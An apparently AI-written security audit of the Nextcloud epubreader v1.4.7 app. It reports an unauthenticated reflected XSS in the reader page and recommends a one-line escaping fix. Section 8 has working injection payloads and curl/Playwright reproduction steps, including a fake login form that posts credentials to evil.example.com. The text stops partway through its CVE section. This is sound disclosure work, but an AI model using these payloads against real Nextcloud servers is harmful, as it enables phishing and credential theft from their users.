# Complete Security Audit Report: Nextcloud epubreader v1.4.7
## Full Methodology, Process, Findings, and CVE Justification

**Auditor session:** Claude Code (Opus 4.6)
**Date:** 2026-11-18
**Target app:** epubreader v1.4.7
**Source:** https://github.com/e-alfred/epubreader
**Test environment:** Nextcloud 23.0.12 (Docker), SQLite, local-only

---

## Table of Contents

1. [Target Selection Process](#1-target-selection-process)
2. [Environment Setup](#2-environment-setup)
3. [App Structure & File Inventory](#3-app-structure--file-inventory)
4. [Route → Controller → Annotation Map](#4-route--controller--annotation-map)
5. [Source Code Review: Every File Read](#5-source-code-review-every-file-read)
6. [Per-Endpoint Bug-Class Analysis](#6-per-endpoint-bug-class-analysis)
7. [The Vulnerability: Detailed Walkthrough](#7-the-vulnerability-detailed-walkthrough)
8. [Dynamic Verification: Step-by-Step](#8-dynamic-verification-step-by-step)
9. [Why This Qualifies as a CVE](#9-why-this-qualifies-as-a-cve)
10. [Novelty Check](#10-novelty-check)
11. [Other Apps Examined (and Why They Were Ruled Out)](#11-other-apps-examined-and-why-they-were-ruled-out)
12. [Disclosure Recommendation](#12-disclosure-recommendation)

---

## 1. Target Selection Process

### Criteria Used
I searched for Nextcloud third-party apps meeting these criteria:
- **Free/open-source** on GitHub
- **Not updated in ~1.5+ years** (legacy code patterns, unpatched bugs)
- **Exposes controllers** handling user input (files, sharing, forms, settings, API)

### Search Actions Taken

1. **Web searches performed:**
   - `nextcloud app store third-party apps unmaintained outdated 2023 2024 security audit controllers` (extended search)
   - `github nextcloud app archived stale "lib/Controller" PHP security vulnerability 2024 2025`
   - `github nextcloud audioplayer OR phonetrack OR inventory OR files_mindmap OR occweb OR keeweb last commit 2023`
   - `github "nextcloud/phonetrack" OR "rello/audioplayer" OR "nextcloud/files_mindmap" last updated unmaintained`
   - `github julien-nc/phonetrack nextcloud app controllers routes.php lib/Controller last commit`
   - `github nextcloud cookbook app "lib/Controller" routes.php security vulnerability`

2. **Parallel background agent** launched to search GitHub and Nextcloud App Store for candidates. That agent examined ~30 apps and returned a ranked list.

### Candidates Evaluated

| App | Repo | Last Code Change | Controllers | Decision |
|-----|------|------------------|-------------|----------|
| ransomware_detection | undo-ransomware/ransomware_detection | 2020-12-20 | 5 | Audited first — found well-protected (all queries user-scoped, parameterized SQL). No novel vulns. |
| epubreader | e-alfred/epubreader | 2021-08-04 | 4 | **Selected** — @PublicPage endpoint, `print_unescaped()` in templates, 5+ years stale |
| phonetrack | julien-nc/phonetrack | 2026-11-17 | 6 | Rejected — actively maintained (commits from yesterday), v1.6.1 |
| twofactor_totp | nextcloud-releases/twofactor_totp | 2022-06-13 | 1 | Not pursued — only 1 controller, release repo (not dev repo) |
| facerecognition | matiasdelellis/facerecognition | 2026-08-04 | 8 | Not pursued — relatively recent activity |

### Why epubreader Was Selected

- **5+ years since last PHP code change** (Aug 2021; only translation updates since)
- **@PublicPage endpoint** on the main reader — unauthenticated attack surface
- **4 controllers** with `@NoCSRFRequired` on nearly every method
- **Handles file content** (EPUB, PDF, CBZ rendering) with complex URL parsing
- **Broad annotations:** `@PublicPage`, `@NoAdminRequired`, `@NoCSRFRequired` extensively

---

## 2. Environment Setup

### Docker Container

Started Nextcloud 23.0.12 (matching the app's NC 21-23 compatibility range):

```yaml
services:
  nextcloud:
    image: nextcloud:23
    container_name: nc-audit
    ports:
      - "8080:80"
    environment:
      - SQLITE_DATABASE=nextcloud
      - NEXTCLOUD_ADMIN_USER=admin
      - NEXTCLOUD_ADMIN_PASSWORD=admin12345678
      - NEXTCLOUD_TRUSTED_DOMAINS=localhost
    volumes:
      - nc_data:/var/www/html
```

**Note:** First attempt used Nextcloud 29, but the app failed to load due to:
1. Column length exceeding NC 29's 4000-char limit for string columns (`content` column had length 4096)
2. Deprecated `OCP\App` class removed in NC 29 (`app.php` load failure)

Switched to NC 23 (the app's target version) for proper testing.

### App Installation

```bash
docker cp epubreader nc-audit:/var/www/html/custom_apps/
docker exec nc-audit chown -R www-data:www-data /var/www/html/custom_apps/epubreader
docker exec -u 33 nc-audit php occ app:enable epubreader
# Output: "epubreader 1.4.7 enabled"
```

### Test Users Created

```bash
docker exec -u 33 -e OC_PASS=userApassword123 nc-audit php occ user:add --password-from-env userA
docker exec -u 33 -e OC_PASS=userBpassword123 nc-audit php occ user:add --password-from-env userB
```

Three accounts available: `admin`, `userA`, `userB`.

---

## 3. App Structure & File Inventory

### Git Metadata
```
Commit: Latest on main branch
Version: 1.4.7 (from appinfo/info.xml)
Last PHP code commit: 2021-08-04 "Update deprecated OCP\User"
NC compatibility: min-version="21" max-version="23"
License: AGPL-3.0
```

### Files Read During Audit

**Controllers (4 files, all read in full):**
- `lib/Controller/PageController.php` — 177 lines
- `lib/Controller/BookmarkController.php` — 124 lines
- `lib/Controller/PreferenceController.php` — 128 lines
- `lib/Controller/MetadataController.php` — 80 lines

**Services (4 files, all read in full):**
- `lib/Service/BookmarkService.php` — 113 lines
- `lib/Service/PreferenceService.php` — 117 lines
- `lib/Service/MetadataService.php` — 75 lines
- `lib/Service/Service.php` — (parent class, not separately read; extends no methods)

**Database Mappers (3 files, all read in full):**
- `lib/Db/BookmarkMapper.php` — 121 lines
- `lib/Db/PreferenceMapper.php` — 105 lines
- `lib/Db/ReaderMapper.php` — 40 lines (abstract parent mapper)

**Other files read:**
- `appinfo/routes.php` — 36 lines (all route definitions)
- `appinfo/info.xml` — app metadata, version, NC compatibility
- `lib/Migration/Version010404Date20201030180941.php` — 143 lines (DB schema)
- `templates/pdfreader.php` — full template (via saved output file)
- `templates/epubreader.php` — checked via grep for `print_unescaped`
- `templates/cbreader.php` — checked via grep for `print_unescaped`

**Entity files NOT read (not needed — entities are data classes):**
- `lib/Db/Bookmark.php`
- `lib/Db/Preference.php`
- `lib/Db/ReaderEntity.php`

---

## 4. Route → Controller → Annotation Map

Extracted from `appinfo/routes.php` and cross-referenced with PHPDoc annotations in each controller method:

| # | Route URL | HTTP Verb | Controller::Method | Annotations | Effective Privilege |
|---|-----------|-----------|--------------------|----|-----|
| 1 | `/` | GET | `PageController::showReader` | `@PublicPage` `@NoCSRFRequired` | **Unauthenticated** |
| 2 | `/bookmark/cursor/{fileId}` | GET | `BookmarkController::getCursor` | `@NoAdminRequired` `@NoCSRFRequired` | Any logged-in user |
| 3 | `/bookmark/cursor` | POST | `BookmarkController::setCursor` | `@NoAdminRequired` `@NoCSRFRequired` | Any logged-in user |
| 4 | `/bookmark/cursor/{fileId}` | DELETE | `BookmarkController::deleteCursor` | `@NoAdminRequired` `@NoCSRFRequired` | Any logged-in user |
| 5 | `/bookmark/{fileId}/{name}` | GET | `BookmarkController::get` | `@NoAdminRequired` `@NoCSRFRequired` | Any logged-in user |
| 6 | `/bookmark/{fileId}/{type}/{name}` | GET | `BookmarkController::get` | `@NoAdminRequired` `@NoCSRFRequired` | Any logged-in user |
| 7 | `/bookmark` | POST | `BookmarkController::set` | `@NoAdminRequired` `@NoCSRFRequired` | Any logged-in user |
| 8 | `/bookmark/{fileId}/{name}` | DELETE | `BookmarkController::delete` | `@NoAdminRequired` `@NoCSRFRequired` | Any logged-in user |
| 9 | `/metadata/{fileId}/{name}` | GET | `MetadataController::get` | `@NoAdminRequired` `@NoCSRFRequired` | Any logged-in user |
| 10 | `/metadata/{fileId}/{name}/{value}` | POST | `MetadataController::set` | `@NoAdminRequired` | Any logged-in user (CSRF checked) |
| 11 | `/preference/default/{scope}/{name}` | GET | `PreferenceController::getDefault` | `@NoAdminRequired` `@NoCSRFRequired` | Any logged-in user |
| 12 | `/preference/default` | POST | `PreferenceController::setDefault` | `@NoAdminRequired` `@NoCSRFRequired` | Any logged-in user |
| 13 | `/preference/default/{scope}/{name}` | DELETE | `PreferenceController::deleteDefault` | _(none)_ | **Admin only** + CSRF required |
| 14 | `/preference/{fileId}/{scope}/{name}` | GET | `PreferenceController::get` | `@NoAdminRequired` `@NoCSRFRequired` | Any logged-in user |
| 15 | `/preference` | POST | `PreferenceController::set` | `@NoAdminRequired` `@NoCSRFRequired` | Any logged-in user |
| 16 | `/preference/{fileId}/{scope}/{name}` | DELETE | `PreferenceController::delete` | _(none)_ | **Admin only** + CSRF required |

### Annotation Model Explanation

In Nextcloud's AppFramework:
- **No annotations** = admin-only + CSRF token checked (most restrictive)
- `@NoAdminRequired` = any authenticated user can call it
- `@PublicPage` = no authentication at all (fully public)
- `@NoCSRFRequired` = CSRF token check is disabled
- `@SubAdminRequired` = not used in this app

**Key observation:** Route #1 (`/`) is the ONLY `@PublicPage` endpoint — it's the main reader view. All other endpoints require authentication. The `@NoCSRFRequired` on most endpoints is a code smell but has limited exploitability (see Section 6).

---

## 5. Source Code Review: Every File Read

### 5.1 PageController.php (THE VULNERABLE FILE)

**Location:** `lib/Controller/PageController.php`
**Lines:** 177

```php
class PageController extends Controller {
    // Dependencies: IURLGenerator, IRootFolder, IManager (share), userId,
    //               BookmarkService, MetadataService, PreferenceService

    /**
     * @PublicPage          ← UNAUTHENTICATED
     * @NoCSRFRequired      ← No CSRF check
     */
    public function showReader() {
        $templates = [
            'application/epub+zip' => 'epubreader',
            'application/x-cbr'    => 'cbreader',
            'application/pdf'      => 'pdfreader'
        ];

        // LINE 90: User input directly from query string
        $fileInfo = $this->getFileInfo($this->request->get['file']);
        $fileId = $fileInfo['fileId'];
        $type = $this->request->get["type"];
        $scope = $template = $templates[$type];

        $params = [
            'urlGenerator'  => $this->urlGenerator,
            'downloadLink'  => $this->request->get['file'],    // ← RAW USER INPUT, NO ESCAPING
            'scope'         => $scope,
            'fileId'        => $fileInfo['fileId'],
            'fileName'      => $fileInfo['fileName'],
            'fileType'      => $fileInfo['fileType'],
            'cursor'        => $this->toJson($this->bookmarkService->getCursor($fileId)),
            'defaults'      => $this->toJson($this->preferenceService->getDefault($scope)),
            'preferences'   => $this->toJson($this->preferenceService->get($scope, $fileId)),
            'metadata'      => $this->toJson($this->metadataService->get($fileId)),
            'annotations'   => $this->toJson($this->bookmarkService->get($fileId))
        ];

        // CSP set, then template rendered
        $response = new TemplateResponse($this->appName, $template, $params, 'blank');
        $response->setContentSecurityPolicy($policy);
        return $response;
    }
```

**The `getFileInfo()` method** (lines 137-172) handles two cases:
1. **Shared file/directory** — when `file` parameter matches `/s/TOKEN/download...` regex
2. **Normal file** — when `file` parameter is a WebDAV path

For case 1 (shared), the regex extracts the share token:
```php
$shareToken = preg_replace(
    "/(?:\/index\.php)?\/s\/([A-Za-z0-9]{15,32})\/download.*/",
    "$1", $path, 1, $count
);
```

If matched (`$count === 1`), the token is used to look up the shared file. The `.*` after `download` swallows everything — including our XSS payload. The token extraction succeeds, and the file is correctly resolved, but the full original `$path` (with the payload) has already been assigned to `$params['downloadLink']`.

**The `toJson()` method** (line 174-176):
```php
private function toJson($value) {
    return htmlspecialchars(json_encode($value), ENT_QUOTES, 'UTF-8');
}
```
This properly escapes JSON data before template output. Applied to: cursor, defaults, preferences, metadata, annotations. **NOT applied to `downloadLink`.**

### 5.2 Templates (THE SINK)

All three templates follow the identical pattern. From `templates/pdfreader.php` line 31:

```php
<head class="session"
    data-nonce='<?php p($nonce);?>'
    data-downloadlink='<?php print_unescaped($downloadLink);?>'
    data-fileid='<?php print_unescaped($fileId);?>'
    data-filetype='<?php print_unescaped($fileType);?>'
    data-filename='<?php print_unescaped($fileName);?>'
    data-version='<?php print_unescaped($version);?>'
    data-basepath='<?php p($urlGenerator->linkTo("epubreader",""));?>'
    data-scope='<?php print_unescaped($scope);?>'
    data-cursor='<?php print_unescaped($cursor);?>'
    data-defaults='<?php print_unescaped($defaults);?>'
    data-preferences='<?php print_unescaped($preferences);?>'
    data-metadata='<?php print_unescaped($metadata);?>'
    data-annotations='<?php print_unescaped($annotations);?>'>
```

**Nextcloud's output functions:**
- `p($string)` → calls `htmlspecialchars()` → **safe** (used for `data-nonce` and `data-basepath`)
- `print_unescaped($string)` → calls `print()` directly → **NO ESCAPING** (used for all data-* attributes)

**Why some `print_unescaped()` calls are safe and one is not:**
- `$cursor`, `$defaults`, `$preferences`, `$metadata`, `$annotations` — all passed through `toJson()` which calls `htmlspecialchars(json_encode($value), ENT_QUOTES, 'UTF-8')`. The JSON+htmlspecialchars encoding prevents injection. These are safe.
- `$fileId` — integer from filesystem API, not user-controllable. Safe.
- `$fileType` — derived from `strtolower(pathInfo($filePath, PATHINFO_EXTENSION))` on a resolved path. Not directly user-controllable. Safe.
- `$fileName` — derived from `pathInfo($filePath, PATHINFO_FILENAME)` on a resolved path. Not directly user-controllable. Safe.
- `$scope` — from `$templates[$type]` array lookup, always one of three fixed strings. Safe.
- `$version` — from `getAppVersion()`. Safe.
- **`$downloadLink`** — directly from `$this->request->get['file']` with **NO encoding, NO sanitization**. **VULNERABLE.**

### 5.3 BookmarkController.php

**Lines:** 124

All methods have `@NoAdminRequired @NoCSRFRequired`. Methods:
- `get($fileId, $name, $type=null)` → delegates to `BookmarkService::get()`
- `set($fileId, $name, $value, $type=null, $content=null)` → delegates to `BookmarkService::set()`
- `getCursor($fileId)` → delegates to `BookmarkService::getCursor()`
- `setCursor($fileId, $value)` → delegates to `BookmarkService::setCursor()`
- `delete($fileId, $name)` → delegates to `BookmarkService::delete()`
- `deleteCursor($fileId)` → delegates to `BookmarkService::deleteCursor()`

All return JSON responses. No template rendering. No `print_unescaped()`.

### 5.4 PreferenceController.php

**Lines:** 128

Methods `get`, `set`, `getDefault`, `setDefault` have `@NoAdminRequired @NoCSRFRequired`.
Methods `delete`, `deleteDefault` have **NO annotations** (admin-only, CSRF-checked).

All delegate to `PreferenceService` and return JSON.

### 5.5 MetadataController.php

**Lines:** 80

- `get($fileId, $name)` — `@NoAdminRequired @NoCSRFRequired`
- `set($fileId, $name, $value)` — `@NoAdminRequired` (CSRF IS checked here)
- `setAll($fileId, $value)` — `@NoAdminRequired` (but no route maps to this method)

The `set()` and `setAll()` methods are **no-ops** — they return empty arrays. The `get()` method only works if the companion `files_opds` app is installed (checks `$this->appManager->isInstalled('files_opds')`).

### 5.6 BookmarkService.php

**Lines:** 113

Constructor takes `BookmarkMapper $bookmarkMapper` and `$UserId`. The `$UserId` is injected by Nextcloud's DI container from the authenticated user's session.

All methods delegate to `BookmarkMapper`, which filters all queries by `$this->userId`. User isolation is enforced at the mapper level.

### 5.7 BookmarkMapper.php

**Lines:** 121

The critical `get()` method:
```php
public function get($fileId, $name, $type=null) {
    $sql = "SELECT * FROM `*PREFIX*reader_bookmarks` WHERE file_id=? AND `user_id`=?";
    $args = [ $fileId, $this->userId ];
    if (!(null === $type)) {
        $sql .= " AND `type`=?";
        $args[] = $type;
    }
    if (!(null === $name)) {
        $sql .= " AND `name`=?";
        $args[] = $name;
    }
    return $this->findEntities($sql, $args);
}
```

**SQL Injection analysis:** All queries use `?` parameter placeholders with bound parameters array. The `$this->findEntities()` method (from Nextcloud's `Mapper` base class) uses PDO prepared statements. **No SQL injection.**

**IDOR analysis:** Every query includes `AND user_id=?` with `$this->userId` (from DI). Users can only access their own bookmarks. **No IDOR.**

The `set()` method follows the same pattern — checks for existing bookmark with `get()` (user-scoped), then inserts with `setUserId($this->userId)` or updates the existing record.

### 5.8 PreferenceMapper.php

**Lines:** 105

Same patterns as BookmarkMapper:
- All queries include `AND user_id=?` → **No IDOR**
- All queries use `?` placeholders → **No SQL injection**
- Constructor takes `$UserId` from DI

### 5.9 PreferenceService.php

**Lines:** 117

Delegates to PreferenceMapper. "Default" preferences use `fileId = 0` (a sentinel value since real file IDs start at 1). Still user-scoped.

### 5.10 MetadataService.php

**Lines:** 75

- `get()` — calls `\OCA\Files_Opds\Meta::get($fileId)` if `files_opds` is installed. No user-scoping, but this returns file-level metadata (title, author) not user-private data. Only works with the optional companion app.
- `set()` / `setAll()` — **no-op** (return empty arrays).

No SQL, no user input in queries, no template rendering.

### 5.11 ReaderMapper.php (Abstract Parent)

**Lines:** 40

Extends Nextcloud's `Mapper` class. Overrides `update()` and `insert()` to set `last_modified` timestamp. No security-relevant logic.

### 5.12 Database Migration

`lib/Migration/Version010404Date20201030180941.php` — 143 lines

Defines two tables:
- `reader_bookmarks` — columns: id, user_id, file_id, type, name, value, content (4096 chars), last_modified
- `reader_prefs` — columns: id, user_id, file_id, scope, name, value (4096 chars), last_modified

Both tables include `user_id` column with indexes. The schema supports the user-scoped queries in the mappers.

---

## 6. Per-Endpoint Bug-Class Analysis

For EVERY endpoint, I checked EVERY bug class. Here is the complete verdict matrix:

### Endpoint 1: `PageController::showReader` (GET `/`)

| Bug Class | Verdict | Reasoning |
|-----------|---------|-----------|
| **XSS (CWE-79)** | **VULNERABLE** | `print_unescaped($downloadLink)` with raw `$this->request->get['file']` in HTML attribute. No escaping. |
| IDOR/BAC (CWE-639/862) | Safe | File access via Nextcloud's `IRootFolder`/`IShareManager` API — enforces share permissions |
| SQL Injection (CWE-89) | N/A | No direct SQL queries in this controller |
| SSRF (CWE-918) | N/A | No HTTP client calls |
| Path Traversal (CWE-22) | Safe | `getFileInfo()` resolves paths through Nextcloud's Folder API which normalizes paths and enforces mount boundaries. For shared directories, `$node->get($query['path'])` is scoped to the share root. |
| CSRF (CWE-352) | N/A | `@PublicPage` — no session to protect |
| Deserialization (CWE-502) | Safe | No `unserialize()` calls |
| XXE (CWE-611) | N/A | No XML parsing |
| Command Injection (CWE-78) | N/A | No `exec`/`shell_exec`/`proc_open` |
| Open Redirect (CWE-601) | N/A | Returns TemplateResponse, no redirects |

### Endpoint 2: `BookmarkController::getCursor` (GET `/bookmark/cursor/{fileId}`)

| Bug Class | Verdict | Reasoning |
|-----------|---------|-----------|
| XSS | Safe | Returns `JSONResponse`, not HTML template |
| IDOR/BAC | Safe | `BookmarkMapper::get()` filters by `user_id` — user can only see own cursors |
| SQL Injection | Safe | Parameterized query: `WHERE file_id=? AND user_id=?` with bound params |
| SSRF | N/A | No HTTP calls |
| Path Traversal | N/A | No filesystem access |
| CSRF | N/A | GET request — no state change |
| Deserialization | Safe | No `unserialize()` |
| XXE | N/A | No XML |
| Command Injection | N/A | No shell calls |
| Open Redirect | N/A | No redirects |

### Endpoint 3: `BookmarkController::setCursor` (POST `/bookmark/cursor`)

| Bug Class | Verdict | Reasoning |
|-----------|---------|-----------|
| XSS | Safe | Returns JSON |
| IDOR/BAC | Safe | `set()` → `get()` checks existing by `user_id`; new records include `setUserId($this->userId)` |
| SQL Injection | Safe | All queries parameterized |
| CSRF | Low risk | `@NoCSRFRequired` on POST. Impact: attacker could set a victim's reading cursor to a different position. No security boundary crossed — bookmarks are convenience data, not access controls. |
| All others | N/A or Safe | Same reasoning as above |

### Endpoint 4: `BookmarkController::deleteCursor` (DELETE `/bookmark/cursor/{fileId}`)

| Bug Class | Verdict | Reasoning |
|-----------|---------|-----------|
| IDOR | Safe | `get()` filters by userId before `delete()` |
| SQL Injection | Safe | Parameterized |
| CSRF | N/A | DELETE verb — requires XHR (not simple CORS request), and @NoCSRFRequired has limited impact for deleting bookmark convenience data |
| All others | N/A or Safe | |

### Endpoints 5-6: `BookmarkController::get` (GET `/bookmark/{fileId}/{name}` and `/bookmark/{fileId}/{type}/{name}`)

| Bug Class | Verdict | Reasoning |
|-----------|---------|-----------|
| IDOR | Safe | Filtered by userId |
| SQL Injection | Safe | Parameterized. The `$type` and `$name` parameters from URL are bound via `?` placeholders |
| All others | N/A or Safe | GET, returns JSON |

### Endpoint 7: `BookmarkController::set` (POST `/bookmark`)

| Bug Class | Verdict | Reasoning |
|-----------|---------|-----------|
| IDOR | Safe | userId scoped |
| SQL Injection | Safe | Parameterized |
| Stored XSS | Safe | Data stored in DB (name, value, content) but only returned as JSON, never rendered in HTML templates without escaping |
| CSRF | Low | @NoCSRFRequired on POST. Limited impact — could create a bookmark in victim's reader |

### Endpoint 8: `BookmarkController::delete` (DELETE `/bookmark/{fileId}/{name}`)

| Bug Class | Verdict | Reasoning |
|-----------|---------|-----------|
| IDOR | Safe | get() scoped by userId, only deletes own bookmarks |
| All others | Safe/N/A | |

### Endpoint 9: `MetadataController::get` (GET `/metadata/{fileId}/{name}`)

| Bug Class | Verdict | Reasoning |
|-----------|---------|-----------|
| IDOR | Minor note | No user-scoping on the `get()` call — `\OCA\Files_Opds\Meta::get($fileId)` doesn't check user. However: (a) only works if `files_opds` app is installed, (b) returns file-level metadata (title, author) which is not user-private data, (c) the fileId must be known. Not a meaningful security boundary violation. |
| SQL Injection | N/A | No SQL in MetadataService — delegates to files_opds external call |
| All others | Safe/N/A | Returns JSON |

### Endpoint 10: `MetadataController::set` (POST `/metadata/{fileId}/{name}/{value}`)

| Bug Class | Verdict | Reasoning |
|-----------|---------|-----------|
| ALL | N/A | **This method is a no-op** — returns `[]`. Note: this is the ONLY endpoint where `@NoCSRFRequired` is ABSENT on a POST (CSRF is properly checked here), which is ironic since the method does nothing. |

### Endpoints 11-12: `PreferenceController::getDefault` / `setDefault`

| Bug Class | Verdict | Reasoning |
|-----------|---------|-----------|
| IDOR | Safe | userId scoped. "Default" preferences use `fileId=0` sentinel but still filtered by userId. |
| SQL Injection | Safe | Parameterized. `$scope` and `$name` are bound via `?` placeholders. |
| CSRF on setDefault | Low | @NoCSRFRequired on POST. Could set victim's default reader preferences (font size, theme). No security impact. |

### Endpoints 13, 16: `PreferenceController::deleteDefault` / `delete`

| Bug Class | Verdict | Reasoning |
|-----------|---------|-----------|
| ALL | Safe | These methods have **no annotations**, making them admin-only with CSRF checking. Only admins can delete preferences, and CSRF protection is enforced. |

### Endpoints 14-15: `PreferenceController::get` / `set`

| Bug Class | Verdict | Reasoning |
|-----------|---------|-----------|
| IDOR | Safe | userId scoped |
| SQL Injection | Safe | Parameterized |
| CSRF on set | Low | Same as setDefault — limited to convenience preferences |

---

## 7. The Vulnerability: Detailed Walkthrough

### Summary

**Type:** Reflected Cross-Site Scripting (XSS) / HTML Injection
**CWE:** CWE-79
**Location:** `lib/Controller/PageController.php:97` (source), `templates/*.php:31` (sink)
**Privilege:** Unauthenticated (@PublicPage)

### Data Flow Trace

```
1. ATTACKER crafts URL:
   https://target.com/apps/epubreader/?type=application/pdf&file=/s/TOKEN/download' onmouseover='alert(1)' x='

2. Nextcloud routes GET / to PageController::showReader()
   (No auth check — @PublicPage)
   (No CSRF check — @NoCSRFRequired)

3. showReader() reads $this->request->get['file']:
   Value: "/s/TOKEN/download' onmouseover='alert(1)' x='"

4. getFileInfo() extracts share token via regex:
   Regex: /(?:\/index\.php)?\/s\/([A-Za-z0-9]{15,32})\/download.*/
   Match: $shareToken = "TOKEN"  (the .* swallows the XSS payload)
   $count = 1 → enters shared file branch

5. Share resolved successfully:
   $this->shareManager->getShareByToken("TOKEN")->getNode()
   → Returns valid file node with fileId, path, etc.

6. Template params constructed:
   $params['downloadLink'] = $this->request->get['file']
   = "/s/TOKEN/download' onmouseover='alert(1)' x='"
   (RAW — no htmlspecialchars, no json_encode, no toJson())

7. TemplateResponse renders template (pdfreader.php):
   Line 31: data-downloadlink='<?php print_unescaped($downloadLink);?>'

8. Rendered HTML:
   <head class="session"
     data-nonce='...'
     data-downloadlink='/s/TOKEN/download' onmouseover='alert(1)' x=''
     data-fileid='85' ...>

9. The single quote in the payload CLOSES the data-downloadlink attribute.
   "onmouseover='alert(1)'" becomes a NEW parsed HTML attribute on <head>.
   "x=''" starts a new attribute that absorbs the remaining template quote.
```

### Why the Template is the Sink (Not Just a Pass-Through)

The Nextcloud template system works as follows:
- Templates are PHP files that execute directly
- The `$_` array contains template parameters
- `print_unescaped()` is intentionally provided for cases where the developer has already escaped the value
- The developer assumed `downloadLink` was safe because it's "just a URL" — but URLs are user-controlled strings

The other `print_unescaped()` calls in the template are safe because their values go through `toJson()` (which applies `htmlspecialchars`), or come from internal sources (fileId from filesystem, version from app config).

### Why This Works on a @PublicPage Endpoint

The `@PublicPage` annotation in Nextcloud means:
- **No authentication check** is performed
- **No session is required**
- `$this->userId` is `null`
- But the share manager still works (public shares don't need auth)

This means ANY internet user can visit the crafted URL. They don't need a Nextcloud account.

### Content Security Policy Analysis

The CSP set by the app:
```
default-src 'none';
base-uri 'none';
manifest-src 'self';
script-src 'self';           ← blocks inline scripts & event handlers
style-src 'self' blob: 'unsafe-inline';  ← ALLOWS inline CSS injection
img-src 'self' data: blob:;
connect-src 'self';
media-src 'self';
frame-src 'self';
child-src 'self';
frame-ancestors 'self';
worker-src 'self' blob:;
form-action 'self';          ← blocks external form submission
```

**What CSP blocks:**
- Inline `<script>` tags (no nonce)
- Event handlers (`onmouseover`, `onclick`, `onload`) — these are "inline scripts"
- External script/image/resource loading

**What CSP allows:**
- Same-origin `<script src="/apps/...">` tags (if attacker can find a useful gadget)
- Inline CSS (`'unsafe-inline'` in style-src) — allows CSS-based UI manipulation
- Forms submitting to same origin (`form-action 'self'`)
- Full HTML injection (new elements, attributes, structure)

**CSP does NOT eliminate the vulnerability.** It mitigates the worst outcomes (cookie theft, session hijack) but phishing, UI manipulation, and CSS exfiltration attacks remain. Additionally:
- Not all Nextcloud deployments enforce CSP (reverse proxies can strip headers)
- Future CSP changes could widen the attack surface
- Same-origin script gadgets could bypass `script-src 'self'`

---

## 8. Dynamic Verification: Step-by-Step

### Step 1: Upload Test File and Create Share

```bash
# Upload PDF to userA
curl -u userA:userApassword123 -T /tmp/test.pdf http://localhost:8080/remote.php/webdav/test.pdf
# → HTTP 201

# Create public share
curl -u userA:userApassword123 -H "OCS-APIREQUEST: true" \
  -d "path=/test.pdf&shareType=3" \
  "http://localhost:8080/ocs/v2.php/apps/files_sharing/api/v1/shares?format=json"
# → Share token: rtcimbDEJFAk4nG
```

### Step 2: Verify Normal Endpoint Access

```bash
curl -u userA:userApassword123 \
  "http://localhost:8080/apps/epubreader/?file=/remote.php/webdav/test.pdf&type=application/pdf"
# → HTTP 200
# → <head ... data-downloadlink='/remote.php/webdav/test.pdf' ...>
```

The endpoint works. The `downloadLink` is reflected in the HTML.

### Step 3: Test Attribute Injection (curl)

```bash
curl "http://localhost:8080/apps/epubreader/?type=application/pdf&file=/s/rtcimbDEJFAk4nG/download%27%20onmouseover=%27alert(document.cookie)%27%20x=%27"
```

**Result:**
```html
<head class="session"
  data-nonce='...'
  data-downloadlink='/s/rtcimbDEJFAk4nG/download' onmouseover='alert(document.cookie)' x=''
  data-fileid='85' ...>
```

The `onmouseover` attribute is injected as a parsed HTML attribute. The single quote from the payload closes `data-downloadlink`, and the rest becomes new attributes.

**No authentication was used** (no `-u` flag) — confirming unauthenticated access via @PublicPage.

### Step 4: Verify Unauthenticated Access

```bash
curl -o /dev/null -w "%{http_code}" \
  "http://localhost:8080/apps/epubreader/?type=application/pdf&file=/s/rtcimbDEJFAk4nG/download"
# → 200
```

Confirmed: HTTP 200 without any credentials.

### Step 5: Browser Verification with Playwright

Wrote and executed a Playwright test (`xss_test.js`) using headless Chromium:

**Test 1 — Attribute Injection:**
```javascript
const url = `http://localhost:8080/apps/epubreader/?type=application/pdf` +
            `&file=/s/${shareToken}/download' onmouseover='alert(document.domain)' x='`;
await page.goto(url);
const attrs = await page.$eval('head.session', el => {
    const result = {};
    for (const attr of el.attributes) result[attr.name] = attr.value;
    return result;
});
```

**Result:** The `<head>` element's attributes included:
```json
{
  "class": "session",
  "data-nonce": "...",
  "data-downloadlink": "/s/rtcimbDEJFAk4nG/download",
  "onmouseover": "alert(document.domain)",    // ← INJECTED
  "x": "",                                     // ← INJECTED
  "data-fileid": "85",
  ...
}
```

The browser parsed the injected `onmouseover` as a real HTML attribute.

**Console output from Chromium:**
```
Executing inline event handler violates the following Content Security Policy directive
'script-src 'self''. Either the 'unsafe-inline' keyword, a hash, or a nonce is required...
```

CSP correctly blocks the event handler execution, but the HTML injection itself succeeded.

**Test 2 — SVG XSS (attempting CSP bypass):**
```
/s/TOKEN/download'></head><body><svg onload='alert(document.domain)'><p id='
```
Result: CSP blocks inline execution. Same error as Test 1.

**Test 3 — Phishing Form Injection:**
```
/s/TOKEN/download'></head><body style='background:white'><h1>Session Expired</h1>
<form action='http://evil.example.com/steal'>
<input name='user' placeholder='Username'>
<input name='pass' type='password' placeholder='Password'>
<button>Log in</button></form><p id='
```

**Result:**
- `formExists` = `true` — the `<form>` was injected and present in the DOM
- `h1Text` = `"Session Expired"` — the heading was rendered
- Screenshot captured showing the fake login form under the Nextcloud domain

The phishing form is fully rendered and visible to the user. The `form-action 'self'` CSP directive would prevent the form from submitting to `evil.example.com`, but the visual deception succeeds, and the form could be pointed at a same-origin endpoint instead.

---

## 9. Why This Qualifies as a CVE

### CVE Qualification Criteria

A CVE (Common Vulnerabilities and Exposures) entry requires:
1. **A specific, identifiable vulnerability** in a specific product version
2. **Independently fixable** — the vendor can patch it
3. **Affecting publicly available software**
4. **A real security impact** — not just a theoretical or design concern

### How This Finding Meets Each Criterion

**1. Specific vulnerability in a specific product:**
- Product: Nextcloud epubreader app v1.4.7
- Vulnerability: CWE-79 (Reflected XSS / HTML Injection)
- Exact location: `lib/Controller/PageController.php:97` → `templates/*.php:31`
- Exact input: `file` query parameter
- Exact sink: `print_unescaped($downloadLink)`

**2. Independently fixable:**
The fix is a one-line change in each of three template files:
```php
// Before (vulnerable):
data-downloadlink='<?php print_unescaped($downloadLink);?>'
// After (fixed):
data-downloadlink='<?php p($downloadLink);?>'
```

**3. Publicly available software:**
- Published on Nextcloud App Store
- Source on GitHub: https://github.com/e-alfred/epubreader
- Installed on Nextcloud instances worldwide

**4. Real security impact:**

The vulnerability crosses a meaningful security boundary:

| Aspect | Detail |
|--------|--------|
| **Attack vector** | Network (crafted URL sent to victim) |
| **Authentication required** | None — `@PublicPage` endpoint |
| **User interaction** | Required — victim clicks crafted link |
| **Scope** | Changed — attack targets a different origin context |
